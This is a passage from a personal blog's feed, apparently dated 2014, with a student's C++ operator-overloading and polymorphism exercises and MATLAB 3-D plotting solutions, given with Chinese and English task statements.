class="line">    c1.display();</span><br><span class="line">    c2.<span class="keyword">operator</span>-=(c1);<span class="comment">//成员函数的重载</span></span><br><span class="line">    <span class="keyword">operator</span>-=(c1, c2);<span class="comment">//友元函数的重载</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2、 定义一个数组类Array：<br>•其私有数据成员为整型一维数组a[10]；<br>•通过构造函数给数组赋初值；<br>•用show函数显示数组的元素值；<br>•用成员函数重载运算符“+”，直接实现两个一维数组对应元素相加的运算。•在主函数中定义数组a、b分别为：<br>int a[10]={1,2,3,4,5,6,7,8,9,10}； int b[10]={4,5,6,7,8,9,10,11,12,13}；<br>•用Array定义三个数组对象arr1(a)、arr2(b)、arr3，执行arr3=arr1+arr2运算，输出arr3的数组元素值。<br>•类似地，用友元函数重载运算符“+=”，实现复合赋值运算：arr1+=arr2，并输出arr1的元素值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  9-2</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by  Edward.L on 12/16/14.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014  Edward.L. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Array</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Array()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Array(<span class="keyword">int</span> b[<span class="number">10</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = b[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; a[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Array <span class="keyword">operator</span> + (Array arr2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">friend</span> Array <span class="keyword">operator</span> +=(Array &amp;arr1, Array &amp;arr2);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Array Array::<span class="keyword">operator</span>+(Array arr2)</span><br><span class="line">&#123;</span><br><span class="line">    Array arr3;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr3.a[i] = <span class="keyword">this</span> -&gt; a[i] + arr2.a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Array <span class="keyword">operator</span>+=(Array &amp;arr1, Array &amp;arr2)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        arr1.a[i] = arr1.a[i] + arr2.a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> b[<span class="number">10</span>] = &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>&#125;;</span><br><span class="line">    <span class="function">Array <span class="title">arr1</span><span class="params">(a)</span>, <span class="title">arr2</span><span class="params">(b)</span>, arr3</span>;</span><br><span class="line">    arr3 = arr1 + arr2;</span><br><span class="line">    arr3.show();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; endl;</span><br><span class="line">    arr1 +=arr2;</span><br><span class="line">    arr1.show();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3、 定义一个人民币类Money；<br>•类中数据成员为元、角、分；<br>•用成员函数与友元函数重载“――”运算符，实现人民币对象的减1运算；<br>•在主函数中定义人民币对象m1=10元8角5分及对象m2、m3，对m1作前置“――”并赋给m2。对m1作后置“――”并赋给m3。显示m1、m2、m3的结果。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  9-3</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by  Edward.L on 12/16/14.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014  Edward.L. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Money</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Money ()</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Money (<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span><br><span class="line">    &#123;</span><br><span class="line">        yuan = a;</span><br><span class="line">        jiao = b;</span><br><span class="line">        fen = c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Money <span class="keyword">operator</span> -- ();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">friend</span> Money <span class="keyword">operator</span> --(Money &amp;m1, <span class="keyword">int</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> yuan, jiao, fen;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> Money::display()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; yuan &lt;&lt; <span class="string">"yuan "</span> &lt;&lt; jiao &lt;&lt; <span class="string">"jiao "</span> &lt;&lt; fen &lt;&lt; <span class="string">"fen"</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Money Money::<span class="keyword">operator</span> --()</span><br><span class="line">&#123;</span><br><span class="line">    yuan --;</span><br><span class="line">    jiao --;</span><br><span class="line">    fen --;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Money <span class="keyword">operator</span> -- (Money &amp;m1,<span class="keyword">int</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">Money <span class="title">m4</span><span class="params">(m1)</span></span>;</span><br><span class="line">    m1.yuan --;</span><br><span class="line">    m1.jiao --;</span><br><span class="line">    m1.fen --;</span><br><span class="line">    <span class="keyword">return</span> m4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Money <span class="title">m1</span><span class="params">(10, 8, 5)</span>, m2, m3 ,m4</span>;</span><br><span class="line">    m4 = m1;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"m1 = "</span>;</span><br><span class="line">    m1.display();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"--m1 = "</span>;</span><br><span class="line">    m2 = -- m1;</span><br><span class="line">    m2.display();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"m1-- = "</span>;</span><br><span class="line">    m3 = m4 --;</span><br><span class="line">    m3.display();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>1、 定义一个复数类，重载“-=”运算符，使这个运算符能直接完成复数的“-=”运算。<br>•分别用成员函数与友元函数编写运算符重载函数；<br>•在主函数中定义复数对象c1(10,20)、c2(15,30)，进行c2-=c1的复数运算，并输出c1、c2的复数值。<br>]]>
    
    </summary>
    
      <category term="c++" scheme="http://edward-l.github.io/tags/c/"/>
    
      <category term="c++" scheme="http://edward-l.github.io/categories/c/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[matlab 3-Dimensional Graphics]]></title>
    <link href="http://edward-l.github.io/2014/12/15/matlab%203-Dimensional%20Graphics/"/>
    <id>http://edward-l.github.io/2014/12/15/matlab 3-Dimensional Graphics/</id>
    <published>2014-12-15T02:06:16.000Z</published>
    <updated>2014-12-15T15:29:34.000Z</updated>
    <content type="html"><![CDATA[<p> <strong>Plot the three dimensional curve graph of the following function: <code>x=sin(z)</code>, <code>y=e^z</code><br>Requirement:The range of z axis is [0, 4pi]; The curve is plotted in red, and the sample points are shown with “+” style; Show the grids; the labels of x and y axes are the above exact functions; Set the title of the figure to be “Three-dimensional space curve”.</strong><br><a id="more"></a><br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="number">0</span>:<span class="number">0.1</span>:<span class="number">4</span>*<span class="built_in">pi</span>;</span><br><span class="line">x=<span class="built_in">sin</span>(z);</span><br><span class="line">y=<span class="built_in">exp</span>(z);</span><br><span class="line">plot3(x,y,z,<span class="string">'r+'</span>);</span><br><span class="line">title(<span class="string">'Three-dimensional space curve'</span>);</span><br><span class="line">grid on;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://7q5frw.com1.z0.glb.clouddn.com/Screen%20Shot%202014-12-15%20at%2010.59.13%20PM.png" alt=""></p>
<p><strong>Try to plot three dimensional graph of the function <code>z=2*x^2+y^2</code>, where <code>x=sin3t</code><br>and <code>y=cos3t</code> . The range of t should be set to [-3, 3], and the ranges of x and y axes are both [-1.2, 1.2].<br>Requirement: Plot the three-dimensional (3-D) mesh graph, 3-D surface graph and 3-D surface graph with contour lines, respectively.<br>In addition, plot the 2-D sectional view graph for <code>x=1</code>.</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">t=-3:0.01:3;</span><br><span class="line">x=<span class="literal">sin</span>(3*t);</span><br><span class="line">y=<span class="literal">cos</span>(3*t);</span><br><span class="line">[x,y]=meshgrid(x,y);</span><br><span class="line">z=2*x.^2+y.^2;</span><br><span class="line">subplot(2,2,1);</span><br><span class="line">mesh(x,y,z);</span><br><span class="line">axis([-1.2,1.2,-1.2,1.2,0,3]);</span><br><span class="line">title('three-dimensional (3-<span class="keyword">D</span>) mesh <span class="keyword">graph</span>');</span><br><span class="line">grid <span class="keyword">on</span>;</span><br><span class="line"></span><br><span class="line">[x,y]=meshgrid([-1:0.1:1]);</span><br><span class="line">z=2*x.^2+y.^2;</span><br><span class="line">subplot(2,2,2);</span><br><span class="line">surf(x,y,z);</span><br><span class="line">axis([-1.2,1.2,-1.2,1.2,0,3]);</span><br><span class="line">title('3-<span class="keyword">D</span> surface <span class="keyword">graph</span>');</span><br><span class="line">grid <span class="keyword">on</span>;</span><br><span class="line"></span><br><span class="line">[x,y]=meshgrid([-1:0.1:1]);</span><br><span class="line">subplot(2,2,3);</span><br><span class="line">surfc(x,y,z);</span><br><span class="line">axis([-1.2,1.2,-1.2,1.2,0,3]);</span><br><span class="line">title('3-<span class="keyword">D</span> surface <span class="keyword">graph</span> with contour lines');</span><br><span class="line">grid <span class="keyword">on</span>;</span><br><span class="line"></span><br><span class="line">subplot(2,2,4);</span><br><span class="line">x=1;</span><br><span class="line">z=2+y.^2;</span><br><span class="line"><span class="keyword">plot</span>(y,z);</span><br><span class="line">axis([-1.2,1.2,0,3]);</span><br><span class="line">title('2-<span class="keyword">D</span> sectional <span class="keyword">view</span> <span class="keyword">graph</span> <span class="keyword">for</span> x=1');</span><br><span class="line">grid <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://7q5frw.com1.z0.glb.clouddn.com/Screen%20Shot%202014-12-15%20at%2010.59.35%20PM.png" alt=""></p>
<p><strong>Plot the 3-D surface graph of <code>z(x,y) = sin((x2+y2)1/2)/(x2+y2)1/2</code>. Requirement: The ranges x and y of x and y axes should both set to be [-10, 10]; Set three different angles to view this graph and show them in 3 figure windows respectively.</strong></p>
<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">x=-</span><span class="number">10</span><span class="xml">:</span><span class="number">0.7</span><span class="xml">:</span><span class="number">10</span><span class="xml">;</span><br><span class="line">y=-</span><span class="number">10</span><span class="xml">:</span><span class="number">0.7</span><span class="xml">:</span><span class="number">10</span><span class="xml">;</span><br><span class="line">[x,y]=meshgrid(x,y);</span><br><span class="line">z=sin((x.</span><span class="keyword">^2</span><span class="xml">+y.</span><span class="keyword">^2</span><span class="xml">).</span><span class="keyword">^0.5</span><span class="xml">)/(x.</span><span class="keyword">^2</span><span class="xml">+y.</span><span class="keyword">^2</span><span class="xml">).</span><span class="keyword">^0.5</span><span class="xml">;</span><br><span class="line">figure;</span><br><span class="line">mesh(x,y,z);</span><br><span class="line">title('view1');</span><br><span class="line">view(</span><span class="number">0</span><span class="xml">,</span><span class="number">0</span><span class="xml">);</span><br><span class="line">figure;</span><br><span class="line">mesh(x,y,z);</span><br><span class="line">title('view2');</span><br><span class="line">view(</span><span class="number">90</span><span class="xml">,</span><span class="number">0</span><span class="xml">);</span><br><span class="line">figure;</span><br><span class="line">mesh(x,y,z);</span><br><span class="line">title('view3');</span><br><span class="line">view(</span><span class="number">50</span><span class="xml">,</span><span class="number">30</span><span class="xml">);</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7q5frw.com1.z0.glb.clouddn.com/Screen%20Shot%202014-12-15%20at%2011.02.57%20PM.png" alt=""><br><img src="http://7q5frw.com1.z0.glb.clouddn.com/Screen%20Shot%202014-12-15%20at%2011.02.48%20PM.png" alt=""><br><img src="http://7q5frw.com1.z0.glb.clouddn.com/Screen%20Shot%202014-12-15%20at%2011.02.38%20PM.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p> <strong>Plot the three dimensional curve graph of the following function: <code>x=sin(z)</code>, <code>y=e^z</code><br>Requirement:The range of z axis is [0, 4pi]; The curve is plotted in red, and the sample points are shown with “+” style; Show the grids; the labels of x and y axes are the above exact functions; Set the title of the figure to be “Three-dimensional space curve”.</strong><br>]]>
    
    </summary>
    
      <category term="3-Dimensional Graphics" scheme="http://edward-l.github.io/tags/3-Dimensional-Graphics/"/>
    
      <category term="matlab" scheme="http://edward-l.github.io/tags/matlab/"/>
    
      <category term="matlab" scheme="http://edward-l.github.io/categories/matlab/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[c＋＋多态实现]]></title>
    <link href="http://edward-l.github.io/2014/12/12/c%EF%BC%8B%EF%BC%8B%E5%A4%9A%E6%80%81%E5%AE%9E%E7%8E%B0/"/>
    <id>http://edward-l.github.io/2014/12/12/c＋＋多态实现/</id>
    <published>2014-12-12T04:06:16.000Z</published>
    <updated>2014-12-12T01:19:09.000Z</updated>
    <content type="html"><![CDATA[<p>1、 设计一个立体图形类（CStereoShape类），并满足如下要求：<br>•CStereoShape类有一个纯虚函数GetArea，能够获取立方体的表面积；<br>•CStereoShape类有一个纯虚函数GetVolume，能够获取立方体的体积；<br><a id="more"></a><br>2、 设计一个立方体类（CCube类），该类继承于CStereoShape类，并满足如下要求：<br>•CCube类有一个带参数的构造函数，其参数分别对应于立方体的长、宽、高。<br>•用一个成员函数来实现对立方体长、宽、高的设置。<br>•重载CStereoShape类的GetArea和GetVolume，分别完成立方体的表面积和体积的计算。</p>
<p>3、 设计一个球体类（CSphere），该类继承于CStereoShape类，并满足如下要求：<br>•CSphere类有一个带参数的构造函数，其参数对应于球体的半径。<br>•用一个成员函数来实现对球体半径的设置。<br>•重载CStereoShape类的GetArea和GetVolume，分别完成球体的表面积和体积的计算。</p>
<p>4、 实现一个main函数，在main函数中至少完成如下工作：<br>•实例化一个CCube类的对象a_cube和CSphere类的对象c_sphere；<br>•定义一个CStereoShape类的指针p；<br>•将a_cube的长、宽和高分别设置为4、5和6；将p指向a_cube，通过p将a_cube的表面积和体积打印到屏幕上；<br>•将c_sphere的半径设置为7；将p指向c_sphere，通过p将c_sphere的表面积和体积打印到屏幕上。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  8-1</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by  Edward.L on 12/10/14.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014  Edward.L. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> PI = <span class="number">3.1415926</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> CStereoShape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">GetArea</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">GetVolume</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> CCube:<span class="keyword">public</span> CStereoShape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CCube(<span class="keyword">double</span> a, <span class="keyword">double</span> b, <span class="keyword">double</span> c)</span><br><span class="line">    &#123;</span><br><span class="line">        length = a;</span><br><span class="line">        width = b;</span><br><span class="line">        height = c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">setdate</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b, <span class="keyword">double</span> c)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        length = a;</span><br><span class="line">        width = b;</span><br><span class="line">        height = c;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">GetArea</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * (length * width + length * height + height * width);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">GetVolume</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> width * height * length;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">double</span> length, width, height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> CSphere:<span class="keyword">public</span> CStereoShape</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CSphere (<span class="keyword">double</span> a)</span><br><span class="line">    &#123;</span><br><span class="line">        r = a;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">setr</span><span class="params">(<span class="keyword">double</span> a)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        r = a;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">GetArea</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span> * PI * r * r;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">double</span> <span class="title">GetVolume</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span> / <span class="number">3</span> * 